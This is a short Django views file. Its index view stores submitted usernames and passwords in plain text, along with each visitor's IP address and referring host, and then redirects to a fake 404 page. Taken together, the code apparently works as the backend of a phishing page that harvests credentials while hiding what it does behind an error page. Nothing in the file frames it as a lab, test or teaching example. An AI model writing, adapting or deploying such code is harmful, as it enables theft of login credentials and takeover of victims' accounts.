from django.shortcuts import render,redirect
from ipaddress import ip_address
from urllib.parse import urlsplit
from .models import FormSubmission

def custom_404(request):
    return render(request, "404.html", status=404)

def index(request):
    if request.method == 'POST':
        try:
            source = urlsplit(request.META.get('HTTP_REFERER', '')).hostname
        except ValueError:
            source = None
        try:
            remote_ip = str(ip_address(request.META.get('REMOTE_ADDR', '')))
        except ValueError:
            remote_ip = None
        FormSubmission.objects.create(
            username=request.POST.get('username', '')[:254],
            password=request.POST.get('password', '')[:254],
            ip_address=remote_ip,
            source=(source or '')[:253],
        )
        return redirect('404/')
       
    return render(request, 'index.html')
